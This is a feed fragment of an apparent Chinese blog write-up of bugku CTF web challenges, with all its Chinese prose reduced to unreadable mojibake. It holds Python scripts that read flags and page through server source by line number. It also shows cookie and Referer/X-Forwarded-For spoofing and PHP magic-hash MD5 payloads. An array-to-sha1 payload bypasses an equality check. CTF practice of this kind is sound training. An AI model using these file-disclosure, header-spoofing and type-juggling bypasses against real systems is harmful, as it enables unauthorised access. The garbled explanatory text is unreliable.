    <link href="/2020/09/10/bugku1/"/>
    <url>/2020/09/10/bugku1/</url>
    
    <content type="html"><![CDATA[<h1 id="bugkuåˆ·é¢˜è®°å½•2"><a href="#bugkuåˆ·é¢˜è®°å½•2" class="headerlink" title="bugkuåˆ·é¢˜è®°å½•2"></a>bugkuåˆ·é¢˜è®°å½•2</h1><a id="more"></a><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>æ‰“å¼€é¡µé¢æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p><p>æŠ“åŒ…çœ‹äº†çœ‹ï¼ŒæƒŠå–œçš„å‘ç°äº†flagå­—æ®µ</p><p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif" alt></p><p>ä¸€æ®µbase64 è§£ç åä¸º<code>NDQyMDIy</code></p><p>æäº¤å‘ç°å¹¶ä¸å¯¹ã€‚ã€‚ã€‚çœ‹æ¥å¦æœ‰ç„æœº</p><p>å¤šgoå‡ æ¬¡åå‘ç°äº†flagå€¼ä¸€ç›´åœ¨å˜ï¼Œå¹¶ä¸”æœ‰ä¸€æ®µæç¤º</p><p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p><p>ç”¨postæ–¹æ³•æäº¤ä½ æ‰€å‘ç°çš„å†…å®¹ï¼Œåªå¥½ä½¿ç”¨è„šæœ¬ï¼ˆä¸ä¼šå†™ï¼‰</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64url=<span class="hljs-string">"http://120.24.86.145:8002/web6/"</span>r=requests.session()headers=r.get(url).headers<span class="hljs-comment">#å› ä¸ºflagåœ¨æ¶ˆæ¯å¤´é‡Œ</span> mid=base64.b64decode(headers[<span class="hljs-string">'flag'</span>])mid=mid.decode()<span class="hljs-comment">#ä¸ºäº†ä¸‹ä¸€æ­¥ç”¨splitä¸æŠ¥é”™ï¼Œb64decodeåæ“ä½œçš„å¯¹è±¡æ˜¯byteç±»å‹çš„å­—ç¬¦ä¸²ï¼Œè€Œsplitå‡½æ•°è¦ç”¨strç±»å‹çš„</span> flag = base64.b64decode(mid.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#è·å¾—flag:åçš„å€¼</span>data=&#123;<span class="hljs-string">'margin'</span>:flag&#125;<span class="hljs-keyword">print</span> (r.post(url,data).text)<span class="hljs-comment">#postæ–¹æ³•ä¼ ä¸Šå»</span></code></pre></div><p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" srcset="/img/loading.gif" alt="headers.png"></p><h2 id="cookieæ¬ºéª—"><a href="#cookieæ¬ºéª—" class="headerlink" title="cookieæ¬ºéª—"></a>cookieæ¬ºéª—</h2><p>æ³¨æ„è§‚å¯Ÿurl<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p><p>line=2&amp;filename=a2V5cy50eHQ=</p><p><code>a2V5cy50eHQ=</code> è§£å¯†æ˜¯ä¸ºkey.txt   lineæ˜¯è¡Œçš„æ„æ€ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŸ¥çœ‹key.txtçš„ç¬¬lineè¡Œçš„ä»£ç </p><p>è¿™é‡Œå¯ä»¥æŸ¥çœ‹<code>index.php</code>æºç   index.phpçš„base64å€¼ä¸º<code>aW5kZXgucGhw</code></p><p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" srcset="/img/loading.gif" alt="cookie1.png"></p><p>æ”¹å˜lineçš„å€¼å¯ä»¥ä¸€è¡Œä¸€è¡Œçš„æŸ¥çœ‹æºç ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl1 = <span class="hljs-string">"http://123.206.87.240:8002/web11/index.php?line="</span>url2 = <span class="hljs-string">"&amp;filename=aW5kZXgucGhw"</span>mysession = requests.session()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):        r = mysession.get(url1+str(i)+url2)    print(r.text)</code></pre></div><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;<span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);$file_list = <span class="hljs-keyword">array</span>(<span class="hljs-string">'0'</span> =&gt;<span class="hljs-string">'keys.txt'</span>,<span class="hljs-string">'1'</span> =&gt;<span class="hljs-string">'index.php'</span>,); <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;       <span class="hljs-comment">//çœ‹è¿™é‡Œ</span>$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;&#125; <span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;$fa = file($file);<span class="hljs-keyword">echo</span> $fa[$line];&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p><p> è¿™é‡Œå¯ä»¥åˆ¤æ–­cookieå¿…é¡»æ»¡è¶³margin=marginæ‰èƒ½è®¿é—®keys.php</p><p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" srcset="/img/loading.gif" alt="bp"></p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>æŸ¥çœ‹æºç æç¤ºäº†</p><p><code>&lt;!--1p.html--&gt;</code>     </p><p>ç›´æ¥è®¿é—®1p.html,å‘ç°ç›´æ¥è·³è½¬åˆ°äº†bugkuçš„ä¸»é¡µï¼Œå…ˆçœ‹æºç ï¼Œå‘ç°ä¸€æ®µç¼–ç åº”è¯¥æ˜¯base64</p><div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div><p>base64è§£ç åä¸ºurlç¼–ç </p><div class="hljs"><pre><code class="hljs angelscript">%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>header%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>Location%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>hello.php%<span class="hljs-number">3</span>Fid%<span class="hljs-number">3</span>D1%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>exit%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>a%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>b%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>stripos%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27.</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>echo%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span><span class="hljs-keyword">return</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>data%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-symbol">20@</span>file_get_contents%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>data%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>bugku%<span class="hljs-number">20</span><span class="hljs-keyword">is</span>%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>nice%<span class="hljs-number">20</span>plateform%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D0%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>strlen%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3E5</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>eregi%<span class="hljs-number">28</span>%<span class="hljs-number">22111</span>%<span class="hljs-number">22.</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">221114</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>D4%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>require%<span class="hljs-number">28</span>%<span class="hljs-number">22f</span>4l2a3g.txt%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aelse%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>print%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>give%<span class="hljs-number">20</span>up%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E</code></pre></div><p>urlè§£ç ä¸ºæºç </p><p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>f(!$_GET[<span class="hljs-string">'id'</span>])&#123;header(<span class="hljs-string">'Location: hello.php?id=1'</span>);<span class="hljs-keyword">exit</span>();&#125;$id=$_GET[<span class="hljs-string">'id'</span>];$a=$_GET[<span class="hljs-string">'a'</span>];$b=$_GET[<span class="hljs-string">'b'</span>];<span class="hljs-keyword">if</span>(stripos($a,<span class="hljs-string">'.'</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'no no no no no no no'</span>;<span class="hljs-keyword">return</span> ;&#125;$data = @file_get_contents($a,<span class="hljs-string">'r'</span>);<span class="hljs-keyword">if</span>($data==<span class="hljs-string">"bugku is a nice plateform!"</span> <span class="hljs-keyword">and</span> $id==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen($b)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">"111"</span>.substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) <span class="hljs-keyword">and</span> substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)&#123;<span class="hljs-keyword">require</span>(<span class="hljs-string">"f4l2a3g.txt"</span>); <span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼Œflagåº”è¯¥è—åœ¨è¿™é‡Œ</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>æœç„¶è—åœ¨f4l2a3g.txt</p><p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif" alt></p><h2 id="è¿‡ç‹—ä¸€å¥è¯"><a href="#è¿‡ç‹—ä¸€å¥è¯" class="headerlink" title="è¿‡ç‹—ä¸€å¥è¯"></a>è¿‡ç‹—ä¸€å¥è¯</h2><p>æ­¤ç«™æ²¡æœ‰flagï¼Œflagè¢«äººåˆ äº†ï¼Œä¸ç”¨å†åšäº†ã€‚â€“ä¸€ä¸ªåšé¢˜çš„è·¯äºº</p><p>flagå¥½åƒçœŸçš„è¢«åˆ äº†ï¼Œåˆ—ä¸å‡ºæ¥ç›®å½•ï¼ŒæŸ¥çœ‹wpä¹Ÿæ²¡æœ‰å¤ç°ã€‚</p><h2 id="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"><a href="#æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ" class="headerlink" title="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"></a>æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-string">'2.php'</span>);$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);<span class="hljs-keyword">if</span>( $IM )&#123;  <span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);&#125;</code></pre></div><p><code>preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p><p>é‡ç‚¹åœ¨è¿™å¥è¯ä¸Šï¼Œè€ƒç‚¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼</p><blockquote><p><strong>å®šç•Œç¬¦ï¼š</strong>/å’Œ/ï¼ˆä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªï¼Œå…¶å®é™¤äº†\å’Œå­—æ¯æ•°å­—å…¶å®ƒçš„åªè¦æ˜¯æˆå¯¹å‡ºç°éƒ½å¯ä»¥çœ‹åšå®šç•Œç¬¦ï¼Œæ¯”å¦‚##ã€ï¼ï¼ä¹‹ç±»çš„ï¼‰ï¼›</p><p><strong>. ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼š</strong>è¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ï¼›</p><p><strong>*  ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼›</p><p><strong>{n,m} ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤4~7æ¬¡ï¼›</p><p><strong>\ ï¼ˆåæ–œçº¿ï¼‰ï¼š</strong>åé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ï¼›</p><p><strong>[a-z] ï¼š</strong>åœ¨aåˆ°zä¸­åŒ¹é… ï¼›</p><p><strong>[[:punct:]] ï¼š</strong>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼›</p><p><strong>/i ï¼š</strong>è¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼›</p></blockquote><p>å› æ­¤å¯ä»¥å†™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ç©¿</p><div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">keyakey22222key:</span><span class="hljs-meta-keyword">/a/</span>aaakeyb!</code></pre></div><h2 id="å‰å¥³å‹-SKCTF"><a href="#å‰å¥³å‹-SKCTF" class="headerlink" title="å‰å¥³å‹(SKCTF)"></a>å‰å¥³å‹(SKCTF)</h2><p>é¢˜ç›®ç½‘å€æ‰“ä¸å¼€</p><h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>é¢˜ç›®ç½‘å€æ‰“ä¸å¼€</p><h2 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h2><p>é¢˜ç›®æç¤º are you from google?</p><p>ä½ æ˜¯ä»googleæ¥çš„å—</p><p>è€ƒå¯Ÿhttpå¤´ä¸­çš„refererå‚æ•°</p><p><strong>Refererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ª ç½‘é¡µ/URL è·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚<br>ä¾‹å¦‚ï¼šRefererï¼š<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></strong> </p><p>é‚£ä¹ˆå°±æŠ“åŒ…ä¿®æ”¹refererè¿™ä¸ªå‚æ•°</p><p><code>Referer: https://www.google.com/</code>,ç›´æ¥goå³å¯</p><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>æºç </p><div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div><p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p><p>å¸¸è§çš„payloadæœ‰</p><div class="hljs"><pre><code class="hljs stylus">QNKCDZO<span class="hljs-number">240610708</span>s878926199as155964671as214587387as214587387a sha1(str)<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span><span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div><h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"><a href="#ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™" class="headerlink" title="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"></a>ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2><p>è§åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†<code>x-forwarded-for</code>ï¼Œæœ¬åœ°åœ°å€å¯ä»¥ä½¿ç”¨IP:127.0.0.1</p><p>å¯ä»¥ä½¿ç”¨googleæµè§ˆå™¨çš„æ’ä»¶<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif" alt></p><p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif" alt></p><p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif" alt></p><h2 id="å„ç§ç»•è¿‡"><a href="#å„ç§ç»•è¿‡" class="headerlink" title="å„ç§ç»•è¿‡"></a>å„ç§ç»•è¿‡</h2><p>é¢˜ç›®æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">'flag.php'</span>);$_GET[<span class="hljs-string">'id'</span>] = urldecode($_GET[<span class="hljs-string">'id'</span>]);$flag = <span class="hljs-string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'uname'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'uname'</span>] == $_POST[<span class="hljs-string">'passwd'</span>])        <span class="hljs-keyword">print</span> <span class="hljs-string">'passwd can not be uname.'</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'uname'</span>]) === sha1($_POST[<span class="hljs-string">'passwd'</span>])&amp;($_GET[<span class="hljs-string">'id'</span>]==<span class="hljs-string">'margin'</span>))        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">'sorry!'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>é¦–å…ˆçœ‹ä¸€ä¸‹è¦ä¼ å…¥å“ªäº›å˜é‡</p><p>get:id uname</p><p>post:passwd</p><p>idéœ€è¦è¿›è¡Œä¸€æ¬¡urldecodeï¼Œè§£ç çš„å€¼ä¸ºmargin</p><p>unameä¸passwdä¸ç›¸åŒï¼Œä½†æ˜¯sha1å€¼è¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ä¸¥æ ¼ç›¸ç­‰ ===ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨sha1å‡½æ•°çš„æ¼æ´ï¼Œæ— æ³•å¤„ç†æ•°ç»„ç±»å‹çš„å˜é‡ï¼Œæœ€åä¼šè¿”å›0ï¼Œä¹Ÿå¯ä»¥ç”¨sha1å¼ºç¢°æ’ã€‚</p><p>payload</p><div class="hljs"><pre><code class="hljs angelscript">urlencode(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>Euname[]=<span class="hljs-number">1</span>passwd[]=<span class="hljs-number">2</span>GET: 